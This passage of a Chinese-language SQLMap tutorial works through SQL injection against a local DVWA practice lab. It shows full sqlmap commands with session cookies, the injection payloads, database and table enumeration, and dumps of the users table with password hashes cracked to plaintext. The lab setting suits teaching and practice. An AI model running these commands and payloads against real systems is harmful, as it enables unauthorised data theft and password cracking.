+<h2 id="7-4-获取表中的列"><a href="#7-4-获取表中的列" class="headerlink" title="7-4 获取表中的列"></a>7-4 获取表中的列</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">sqlmap <br>  <span class="hljs-literal">-u</span> <span class="hljs-string">&quot;http://localhost:81/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot;</span> <br>  <span class="hljs-literal">--cookie</span>=<span class="hljs-string">&quot;PHPSESSID=g9ru8lin880c3191bq7csgoq9s; security=low&quot;</span> <br>  <span class="hljs-literal">-D</span> dvwa <span class="hljs-literal">-T</span> users <span class="hljs-literal">--columns</span><br><br><span class="hljs-comment"># -T users：指定表名</span><br><span class="hljs-comment"># --columns：列出字段</span><br><br>[<span class="hljs-number">15</span>:<span class="hljs-number">38</span>:<span class="hljs-number">34</span>] [<span class="hljs-type">INFO</span>] fetching columns <span class="hljs-keyword">for</span> table <span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">&#x27;dvwa&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">38</span>:<span class="hljs-number">34</span>] [<span class="hljs-type">WARNING</span>] reflective value(s) found and filtering out<br>Database: dvwa<br>Table: users<br>[<span class="hljs-number">8</span> <span class="hljs-type">columns</span>]<br>+<span class="hljs-literal">--------------</span>+<span class="hljs-literal">-------------</span>+<br>| Column       | <span class="hljs-built_in">Type</span>        |<br>+<span class="hljs-literal">--------------</span>+<span class="hljs-literal">-------------</span>+<br>| user         | varchar(<span class="hljs-number">15</span>) |<br>| avatar       | varchar(<span class="hljs-number">70</span>) |<br>| failed_login | int(<span class="hljs-number">3</span>)      |<br>| first_name   | varchar(<span class="hljs-number">15</span>) |<br>| last_login   | timestamp   |<br>| last_name    | varchar(<span class="hljs-number">15</span>) |<br>| password     | varchar(<span class="hljs-number">32</span>) |<br>| user_id      | int(<span class="hljs-number">6</span>)      |<br>+<span class="hljs-literal">--------------</span>+<span class="hljs-literal">-------------</span>+<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="7-5-获取敏感字段"><a href="#7-5-获取敏感字段" class="headerlink" title="7-5 获取敏感字段"></a>7-5 获取敏感字段</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">sqlmap <br>  <span class="hljs-literal">-u</span> <span class="hljs-string">&quot;http://localhost:81/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot;</span> <br>  <span class="hljs-literal">--cookie</span>=<span class="hljs-string">&quot;PHPSESSID=g9ru8lin880c3191bq7csgoq9s; security=low&quot;</span> <br>  <span class="hljs-literal">-D</span> dvwa <span class="hljs-literal">-T</span> users <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;user, password&quot;</span> <span class="hljs-literal">--dump</span> <span class="hljs-literal">--batch</span><br><br><span class="hljs-comment"># -C &quot;user, password&quot;：指定要获取的列</span><br><span class="hljs-comment"># --dump：导出数据</span><br><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] fetching ... <span class="hljs-string">&#x27;`user`,password&#x27;</span> <span class="hljs-keyword">for</span> table <span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">&#x27;dvwa&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">WARNING</span>] something ... Falling back to partial UNION technique<br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">WARNING</span>] the SQL query provided does not <span class="hljs-keyword">return</span> any output<br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;1337&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;8d3533d75ae2c3966d7e0d4fcc69216b&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;admin&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;5f4dcc3b5aa765d61d8327deb882cf99&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;gordonb&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;e99a18c428cb38d5f260853678922e03&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;pablo&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;0d107d09f5bbe40cade3de5c71e9e9b7&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;smithy&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;5f4dcc3b5aa765d61d8327deb882cf99&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] recognized possible password hashes <span class="hljs-keyword">in</span> column <span class="hljs-string">&#x27;password&#x27;</span><br><span class="hljs-keyword">do</span> you want to store hashes to a temporary file ... with other tools [<span class="hljs-type">y</span>/<span class="hljs-type">N</span>] N<br><span class="hljs-keyword">do</span> you want to crack them via a dictionary<span class="hljs-literal">-based</span> attack? [<span class="hljs-type">Y</span>/<span class="hljs-type">n</span>/<span class="hljs-type">q</span>] Y<br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] <span class="hljs-keyword">using</span> hash method <span class="hljs-string">&#x27;md5_generic_passwd&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] resuming password <span class="hljs-string">&#x27;charley&#x27;</span> <span class="hljs-keyword">for</span> hash <span class="hljs-string">&#x27;8d3533d...0d4fcc69216b&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] resuming password <span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-keyword">for</span> hash <span class="hljs-string">&#x27;5f4dcc...27deb882cf99&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] resuming password <span class="hljs-string">&#x27;abc123&#x27;</span> <span class="hljs-keyword">for</span> hash <span class="hljs-string">&#x27;e99a18...60853678922e03&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] resuming password <span class="hljs-string">&#x27;letmein&#x27;</span> <span class="hljs-keyword">for</span> hash <span class="hljs-string">&#x27;0d107...e3de5c71e9e9b7&#x27;</span><br>Database: dvwa<br>Table: users<br>[<span class="hljs-number">5</span> <span class="hljs-type">entries</span>]<br>+<span class="hljs-literal">---------</span>+<span class="hljs-literal">---------------------------------------------</span>+<br>| user    | password                                    |<br>+<span class="hljs-literal">---------</span>+<span class="hljs-literal">---------------------------------------------</span>+<br>| <span class="hljs-number">1337</span>    | <span class="hljs-number">8</span>d3533d75ae2c3966d7e0d4fcc69216b (charley)  |<br>| admin   | <span class="hljs-number">5</span>f4dcc3b5aa765d61d8327deb882cf99 (password) |<br>| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |<br>| pablo   | <span class="hljs-number">0</span>d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |<br>| smithy  | <span class="hljs-number">5</span>f4dcc3b5aa765d61d8327deb882cf99 (password) |<br>+<span class="hljs-literal">---------</span>+<span class="hljs-literal">---------------------------------------------</span>+<br><br>[<span class="hljs-number">15</span>:<span class="hljs-number">41</span>:<span class="hljs-number">42</span>] [<span class="hljs-type">INFO</span>] table <span class="hljs-string">&#x27;dvwa.users&#x27;</span> dumped to CSV file <br><span class="hljs-string">&#x27;C:\Users\...\AppData\Local\sqlmap\output\localhost\dump\dvwa\users.csv&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="8-SQLMap中级进阶"><a href="#8-SQLMap中级进阶" class="headerlink" title="8 SQLMap中级进阶"></a>8 SQLMap中级进阶</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs MarkDown">将DVWA靶场设为Medium，目标地址为http://localhost:81/vulnerabilities/sqli/<br>SQL Injection使用了POST方法(POST注入使用--data参数)，并且前端使用下拉菜单<br>F12查看cookie，切换到负载查看，表单数据仍然为id=1&amp;Submit=Submit<br>cookie值：PHPSESSID=g9ru8lin880c3191bq7csgoq9s; security=medium<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="8-1-确认注入点"><a href="#8-1-确认注入点" class="headerlink" title="8-1 确认注入点"></a>8-1 确认注入点</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">sqlmap<br>  <span class="hljs-literal">-u</span> <span class="hljs-string">&quot;http://localhost:81/vulnerabilities/sqli/&quot;</span><br>  <span class="hljs-literal">--cookie</span>=<span class="hljs-string">&quot;PHPSESSID=g9ru8lin880c3191bq7csgoq9s; security=medium&quot;</span><br>  <span class="hljs-literal">--data</span>=<span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> <span class="hljs-literal">-p</span> id <span class="hljs-literal">--batch</span><br><br><span class="hljs-comment"># --data：这是一个POST请求，并放入请求体内容</span><br><span class="hljs-comment"># -p：指定测试参数为id</span><br><span class="hljs-comment"># 若存在多个参数，优先考虑id、uid、user_id(看起来类似数据库的参数)</span><br><span class="hljs-comment"># 其次keyword、search(搜索框对应的参数)，最后sort、order(排序参数)</span><br><span class="hljs-comment"># 如果都失败，就不指定参数，让SQLMap全扫并适当提高--level</span><br><br>[<span class="hljs-number">16</span>:<span class="hljs-number">25</span>:<span class="hljs-number">52</span>] [<span class="hljs-type">INFO</span>] target URL appears to have <span class="hljs-number">2</span> columns <span class="hljs-keyword">in</span> query<br>[<span class="hljs-number">16</span>:<span class="hljs-number">25</span>:<span class="hljs-number">52</span>] [<span class="hljs-type">INFO</span>] POST <span class="hljs-keyword">parameter</span> <span class="hljs-string">&#x27;id&#x27;</span> is <span class="hljs-string">&#x27;...&#x27;</span> injectable<br>POST <span class="hljs-keyword">parameter</span> <span class="hljs-string">&#x27;id&#x27;</span> is vulnerable. <span class="hljs-keyword">Do</span> you want to ... the others (<span class="hljs-keyword">if</span> any)? [<span class="hljs-type">y</span>/<span class="hljs-type">N</span>] N<br>sqlmap identified the following injection point(s) with a total of <span class="hljs-number">47</span> HTTP(s) requests:<br><span class="hljs-literal">---</span><br><span class="hljs-keyword">Parameter</span>: id (POST)<br>    <span class="hljs-built_in">Type</span>: boolean<span class="hljs-literal">-based</span> blind<br>    Title: Boolean<span class="hljs-literal">-based</span> blind - <span class="hljs-keyword">Parameter</span> replace (original value)<br>    Payload: id=(<span class="hljs-built_in">SELECT</span> (CASE WHEN (<span class="hljs-number">2937</span>=<span class="hljs-number">2937</span>) THEN <span class="hljs-number">1</span> <span class="hljs-keyword">ELSE</span> (...) <span class="hljs-keyword">END</span>))&amp;Submit=Submit<br><br>    <span class="hljs-built_in">Type</span>: error<span class="hljs-literal">-based</span><br>    Title: MySQL &gt;= <span class="hljs-number">5.6</span> AND error<span class="hljs-literal">-based</span> ..., ORDER BY or <span class="hljs-built_in">GROUP</span> BY clause (GTID_SUBSET)<br>    Payload: id=<span class="hljs-number">1</span> AND GTID_SUBSET(CONCAT(...),<span class="hljs-number">4380</span>)&amp;Submit=Submit<br><br>    <span class="hljs-built_in">Type</span>: time<span class="hljs-literal">-based</span> blind<br>    Title: MySQL &gt;= <span class="hljs-number">5.0</span>.<span class="hljs-number">12</span> AND time<span class="hljs-literal">-based</span> blind (query <span class="hljs-built_in">SLEEP</span>)<br>    Payload: id=<span class="hljs-number">1</span> AND (<span class="hljs-built_in">SELECT</span> <span class="hljs-number">5029</span> FROM (<span class="hljs-built_in">SELECT</span>(<span class="hljs-built_in">SLEEP</span>(<span class="hljs-number">5</span>)))JdIC)&amp;Submit=Submit<br><br>    <span class="hljs-built_in">Type</span>: UNION query<br>    Title: Generic UNION query (NULL) - <span class="hljs-number">2</span> columns<br>    Payload: id=<span class="hljs-number">1</span> UNION ALL <span class="hljs-built_in">SELECT</span> NULL,CONCAT(...)<span class="hljs-literal">--</span> -&amp;Submit=Submit<br><span class="hljs-literal">---</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="8-2-获取数据库"><a href="#8-2-获取数据库" class="headerlink" title="8-2 获取数据库"></a>8-2 获取数据库</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">sqlmap<br>  <span class="hljs-literal">-u</span> <span class="hljs-string">&quot;http://localhost:81/vulnerabilities/sqli/&quot;</span><br>  <span class="hljs-literal">--cookie</span>=<span class="hljs-string">&quot;PHPSESSID=g9ru8lin880c3191bq7csgoq9s; security=medium&quot;</span><br>  <span class="hljs-literal">--data</span>=<span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> <span class="hljs-literal">--dbs</span><br><br>[<span class="hljs-number">16</span>:<span class="hljs-number">31</span>:<span class="hljs-number">56</span>] [<span class="hljs-type">INFO</span>] fetching database names<br>available databases [<span class="hljs-number">2</span>]:<br>[*] dvwa<br>[*] information_schema<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="8-3-获取数据库表"><a href="#8-3-获取数据库表" class="headerlink" title="8-3 获取数据库表"></a>8-3 获取数据库表</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">sqlmap<br>  <span class="hljs-literal">-u</span> <span class="hljs-string">&quot;http://localhost:81/vulnerabilities/sqli/&quot;</span><br>  <span class="hljs-literal">--cookie</span>=<span class="hljs-string">&quot;PHPSESSID=g9ru8lin880c3191bq7csgoq9s; security=medium&quot;</span><br>  <span class="hljs-literal">--data</span>=<span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> <span class="hljs-literal">-D</span> dvwa <span class="hljs-literal">--tables</span><br><br>[<span class="hljs-number">16</span>:<span class="hljs-number">32</span>:<span class="hljs-number">31</span>] [<span class="hljs-type">INFO</span>] fetching tables <span class="hljs-keyword">for</span> database: <span class="hljs-string">&#x27;dvwa&#x27;</span><br>Database: dvwa<br>[<span class="hljs-number">2</span> <span class="hljs-type">tables</span>]<br>+<span class="hljs-literal">-----------</span>+<br>| guestbook |<br>| users     |<br>+<span class="hljs-literal">-----------</span>+<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="8-4-获取表中的列"><a href="#8-4-获取表中的列" class="headerlink" title="8-4 获取表中的列"></a>8-4 获取表中的列</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">sqlmap<br>  <span class="hljs-literal">-u</span> <span class="hljs-string">&quot;http://localhost:81/vulnerabilities/sqli/&quot;</span><br>  <span class="hljs-literal">--cookie</span>=<span class="hljs-string">&quot;PHPSESSID=g9ru8lin880c3191bq7csgoq9s; security=medium&quot;</span><br>  <span class="hljs-literal">--data</span>=<span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> <span class="hljs-literal">-D</span> dvwa <span class="hljs-literal">-T</span> users <span class="hljs-literal">--columns</span><br><br>[<span class="hljs-number">16</span>:<span class="hljs-number">33</span>:<span class="hljs-number">25</span>] [<span class="hljs-type">INFO</span>] fetching columns <span class="hljs-keyword">for</span> table <span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">&#x27;dvwa&#x27;</span><br>Database: dvwa<br>Table: users<br>[<span class="hljs-number">8</span> <span class="hljs-type">columns</span>]<br>+<span class="hljs-literal">--------------</span>+<span class="hljs-literal">-------------</span>+<br>| Column       | <span class="hljs-built_in">Type</span>        |<br>+<span class="hljs-literal">--------------</span>+<span class="hljs-literal">-------------</span>+<br>| user         | varchar(<span class="hljs-number">15</span>) |<br>| avatar       | varchar(<span class="hljs-number">70</span>) |<br>| failed_login | int(<span class="hljs-number">3</span>)      |<br>| first_name   | varchar(<span class="hljs-number">15</span>) |<br>| last_login   | timestamp   |<br>| last_name    | varchar(<span class="hljs-number">15</span>) |<br>| password     | varchar(<span class="hljs-number">32</span>) |<br>| user_id      | int(<span class="hljs-number">6</span>)      |<br>+<span class="hljs-literal">--------------</span>+<span class="hljs-literal">-------------</span>+<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="8-5-获取敏感字段"><a href="#8-5-获取敏感字段" class="headerlink" title="8-5 获取敏感字段"></a>8-5 获取敏感字段</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">sqlmap<br>  <span class="hljs-literal">-u</span> <span class="hljs-string">&quot;http://localhost:81/vulnerabilities/sqli/&quot;</span><br>  <span class="hljs-literal">--cookie</span>=<span class="hljs-string">&quot;PHPSESSID=g9ru8lin880c3191bq7csgoq9s; security=medium&quot;</span><br>  <span class="hljs-literal">--data</span>=<span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> <span class="hljs-literal">-D</span> dvwa <span class="hljs-literal">-T</span> users <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;user,password&quot;</span> <span class="hljs-literal">--dump</span> <span class="hljs-literal">--batch</span><br><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] fetching ... <span class="hljs-string">&#x27;`user`,password&#x27;</span> <span class="hljs-keyword">for</span> table <span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">&#x27;dvwa&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">WARNING</span>] something ... Falling back to partial UNION technique<br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">WARNING</span>] the SQL query provided does not <span class="hljs-keyword">return</span> any output<br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;1337&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;8d3533d75ae2c3966d7e0d4fcc69216b&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;admin&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;5f4dcc3b5aa765d61d8327deb882cf99&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;gordonb&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;e99a18c428cb38d5f260853678922e03&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;pablo&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;0d107d09f5bbe40cade3de5c71e9e9b7&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;smithy&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-string">&#x27;5f4dcc3b5aa765d61d8327deb882cf99&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] recognized possible password hashes <span class="hljs-keyword">in</span> column <span class="hljs-string">&#x27;password&#x27;</span><br><span class="hljs-keyword">do</span> you want to store hashes to a temporary file <span class="hljs-keyword">for</span> ... with other tools [<span class="hljs-type">y</span>/<span class="hljs-type">N</span>] N<br><span class="hljs-keyword">do</span> you want to crack them via a dictionary<span class="hljs-literal">-based</span> attack? [<span class="hljs-type">Y</span>/<span class="hljs-type">n</span>/<span class="hljs-type">q</span>] Y<br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] <span class="hljs-keyword">using</span> hash method <span class="hljs-string">&#x27;md5_generic_passwd&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] resuming password <span class="hljs-string">&#x27;charley&#x27;</span> <span class="hljs-keyword">for</span> hash <span class="hljs-string">&#x27;8d353...66d7e0d4fcc69216b&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] resuming password <span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-keyword">for</span> hash <span class="hljs-string">&#x27;5f4d...61d8327deb882cf99&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] resuming password <span class="hljs-string">&#x27;abc123&#x27;</span> <span class="hljs-keyword">for</span> hash <span class="hljs-string">&#x27;e99a18...5f260853678922e03&#x27;</span><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] resuming password <span class="hljs-string">&#x27;letmein&#x27;</span> <span class="hljs-keyword">for</span> hash <span class="hljs-string">&#x27;0d107...cade3de5c71e9e9b7&#x27;</span><br>Database: dvwa<br>Table: users<br>[<span class="hljs-number">5</span> <span class="hljs-type">entries</span>]<br>+<span class="hljs-literal">---------</span>+<span class="hljs-literal">---------------------------------------------</span>+<br>| user    | password                                    |<br>+<span class="hljs-literal">---------</span>+<span class="hljs-literal">---------------------------------------------</span>+<br>| <span class="hljs-number">1337</span>    | <span class="hljs-number">8</span>d3533d75ae2c3966d7e0d4fcc69216b (charley)  |<br>| admin   | <span class="hljs-number">5</span>f4dcc3b5aa765d61d8327deb882cf99 (password) |<br>| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |<br>| pablo   | <span class="hljs-number">0</span>d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |<br>| smithy  | <span class="hljs-number">5</span>f4dcc3b5aa765d61d8327deb882cf99 (password) |<br>+<span class="hljs-literal">---------</span>+<span class="hljs-literal">---------------------------------------------</span>+<br><br>[<span class="hljs-number">16</span>:<span class="hljs-number">36</span>:<span class="hljs-number">16</span>] [<span class="hljs-type">INFO</span>] table <span class="hljs-string">&#x27;dvwa.users&#x27;</span> dumped to CSV file <br><span class="hljs-string">&#x27;C:\Users\...\AppData\Local\sqlmap\output\localhost\dump\dvwa\users.csv&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="8-6-使用请求文件"><a href="#8-6-使用请求文件" class="headerlink" title="8-6 使用请求文件"></a>8-6 使用请求文件</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell"><span class="hljs-comment"># 【高级技巧】点击SQL Injection的Submit按钮，并使用Fiddler获取整个HTTP请求文件</span><br><span class="hljs-comment"># Fiddler选中请求 &gt; 右键Save 